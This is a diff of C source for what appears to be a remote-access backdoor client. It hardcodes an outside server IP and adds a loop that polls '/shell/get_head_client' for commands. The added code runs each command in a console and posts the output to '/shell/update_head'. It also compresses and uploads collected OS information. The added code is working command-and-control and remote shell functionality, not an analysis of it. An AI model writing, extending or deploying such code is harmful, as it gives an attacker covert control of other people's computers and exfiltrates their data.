@@ -18,12 +18,11 @@
 
 
 
-#define USE_LOCAL 1
 
-#if USE_LOCAL
+#ifdef USE_LOCAL
     #define PROXY_ADDR "127.0.0.1"
 #else
-    #define PROXY_ADDR "<secret>"
+    #define PROXY_ADDR "87.251.78.132"
 #endif
 
 #define _STRINGIZE(value) #value
@@ -87,6 +86,27 @@ POSInfo OSInfoFromJSON(const char * data)
 
 #undef USE_COUNTER
 
+fbuf_ptr zipDataBalance(char * data)
+{
+    fbuf_ptr buffer;
+    char * encoded;
+    uint32_t encodedSize;
+    encoded = encode_deflate(data, strlen(data), &encodedSize, Z_BALANCE);
+
+    if (!encoded) {
+        return NULL;
+    }
+
+    buffer = fbuf_new_with_size(0);
+    
+    if (!buffer) return NULL;
+    
+    buffer->data = encoded;
+    buffer->bytes = encodedSize;
+
+    return buffer;
+}
+
 int PostOSInfo(void * ctx)
 {
     HttpClient * http_client = NewSSLClient();
@@ -106,10 +126,12 @@ int PostOSInfo(void * ctx)
         
         if (latest_info)
         {
-            char * json = OSInfoToJson(latest_info);
+            fbuf_ptr buffer = NULL;
+            char * json = NULL;
+            json = OSInfoToJson(latest_info);
+            buffer = zipDataBalance(json);
             
-            HttpClientSetDataSent(http_client, json, strlen(json), false);
-
+            HttpClientSetDataSent(http_client, buffer->data, buffer->bytes, false);
             HttpClientPerform(http_client);
 
             long sc = HttpClientGetResponseCode(http_client);
@@ -120,6 +142,7 @@ int PostOSInfo(void * ctx)
 
             OSInfoFree(&latest_info);
             free(json);
+            fbuf_free(buffer);
             HttpClientResetBody(http_client);
         }
         
@@ -183,26 +206,42 @@ typedef struct _cmd
 {
     int cmd_type;
     int status;
-    char * os_command;
-    char * uri;
+    char * os_command;  // shell command
+    int exit_code;      // code
+    int stream;         // stdout, stderr
+    char * out;      // output
 
 } command_t;
 
+
+char * DupUtfStringAsBytes(const char * src)
+{
+    pstring_t uString = CreateString(src, UTF8_Size(src), UTF_8);
+    
+    char * bytesCopy = GetNullTerminatedBytes(uString);
+    StringDestroy(uString);
+
+    return bytesCopy;
+}
+
 command_t * ParseCommand(const char * json)
 {
+    
     cJSON * obj = cJSON_Parse(json);
 
     if (!obj) {
         return NULL;
     }
 
-    command_t * cmd = (command_t*)malloc(sizeof(command_t));
+    command_t * cmd = malloc(sizeof(command_t));
     memset(cmd, 0, sizeof(command_t));
 
     
     cmd->cmd_type = (int)cJSON_GetNumberValue(cJSON_GetObjectItem(obj, "cmd_type"));
     cmd->status = (int)cJSON_GetNumberValue(cJSON_GetObjectItem(obj, "status"));
-    cmd->os_command = cJSON_GetStringValue(cJSON_GetObjectItem(obj, "os_command"));
+    cmd->exit_code = (int)cJSON_GetNumberValue(cJSON_GetObjectItem(obj, "exit_code"));
+    cmd->stream = (int)cJSON_GetNumberValue(cJSON_GetObjectItem(obj, "stream_type"));
+    cmd->os_command = DupUtfStringAsBytes(cJSON_GetStringValue(cJSON_GetObjectItem(obj, "os_command")));
     
     cJSON_Delete(obj);
 
@@ -215,7 +254,9 @@ char * CommandToJSON(const command_t * value)
     cJSON_AddNumberToObject(obj, "cmd_type", (double)value->cmd_type);
     cJSON_AddNumberToObject(obj, "status", (double)value->status);
     cJSON_AddStringToObject(obj, "os_command", value->os_command);
-
+    cJSON_AddNumberToObject(obj, "exit_code", (double)value->exit_code);
+    cJSON_AddNumberToObject(obj, "stream_type", (double)value->stream);
+    cJSON_AddStringToObject(obj, "output", value->out);
     char * data = cJSON_PrintUnformatted(obj);
     cJSON_Delete(obj);
     return data;
@@ -620,6 +661,138 @@ int PollAboutCommand(void * arg)
     free(url_turnoff);
 
     return err_code;
+}
+
+/*
+@brief Intristic function!
+*/
+boolean ShellExecuteInternal(CState * ctx, command_t * value) {
+
+
+    fbuf_ptr output = NULL;
+    wchar_t * strCommandWide = NULL;
+
+    /* convert to utf-16 */
+    strCommandWide = UTF8BytesToWide(
+                value->os_command, 
+                (int32_t)UTF8_Size(value->os_command));
+
+    if (strCommandWide) {
+        /* executing command */
+        output = ExecuteCommandInConsole(ctx, strCommandWide);
+        value->out = malloc(output->bytes + 1);
+        memcpy(value->out, output->data, output->bytes);
+        value->out[output->bytes] = '\0';
+        value->status = CMD_STATUS_FINISHED;
+    }
+
+    return false;
+}
+
+
+/* 
+@brief update's command at head in queue on server
+@param cmd updated state of command with exit code and output
+*/
+int UpdateCommandAtHeadInQueue(const command_t * cmd)
+{
+    char * bodyNewState = NULL;
+    char * ep = NULL;
+    HttpClient * httpClient = NULL;
+    int code = -1;
+
+    bodyNewState = CommandToJSON(cmd);
+
+    if (!bodyNewState) goto clean;
+
+    httpClient = NewSSLClient();
+    if (!httpClient) goto clean;
+
+    ep = create_endpoint("/shell/update_head");
+    
+    HttpClientSetUrl(httpClient, ep);
+    HttpClientSetDataSent(httpClient, bodyNewState, strlen(bodyNewState), false);
+
+    HttpClientPerform(httpClient);
+
+    if (HttpClientHasError(httpClient)) {
+        goto clean;
+    }
+
+    code = 0;
+clean:
+    HttpClientFree(httpClient);
+    free(ep);
+    free(bodyNewState);
+    return code;
+}
+
+/* 
+@brief retrieves and executes commands in CMD
+@param ctx context
+*/
+int ShellCommandExecutor(void * ctx)
+{
+    (void)ctx;
+    HttpClient * httpClient;
+    CState console = {0};
+    int code = 0;
+    char * ep;
+    long sc;
+    
+    httpClient = NewSSLClient();
+    if (!httpClient) {
+        printf("NewSSLClient error\n");
+        return -1;
+    }
+    ep = create_endpoint("/shell/get_head_client");
+
+    if (!ep) {
+        printf("create_endpoint error\n");
+        return -1;
+    }
+
+
+
+    HttpClientSetUrl(httpClient, ep);
+
+    // create console
+    if (!CreateNewConsole(&console)) {
+        printf("Couldn't create console.\n");
+        return -1;
+    }
+
+
+    while (true)
+    {
+        HttpClientPerform(httpClient);
+        if (!HttpClientHasError(httpClient)) {
+
+            command_t * cmd = NULL;
+            char * dataCmd = NULL;
+            sc = HttpClientGetResponseCode(httpClient);
+            dataCmd = HttpClientGetData(httpClient);
+            
+            if (dataCmd != NULL && strlen(dataCmd) > 0) {
+                cmd = ParseCommand(dataCmd);
+            } 
+            if (cmd) {
+                if (sc == HTTP_OK && cmd->status != CMD_STATUS_FINISHED) 
+                {
+                    printf("<! received commmand: %s\n", cmd->os_command);
+                    ShellExecuteInternal(&console, cmd);
+                    UpdateCommandAtHeadInQueue(cmd);
+                }
+            }
+             
+
+        }
+
+        HttpClientResetBody(httpClient);
+        ThreadSleepSeconds(SLEEP_SECONDS_DEFAULT);
+    }
+
+    return code;
 }
 
 
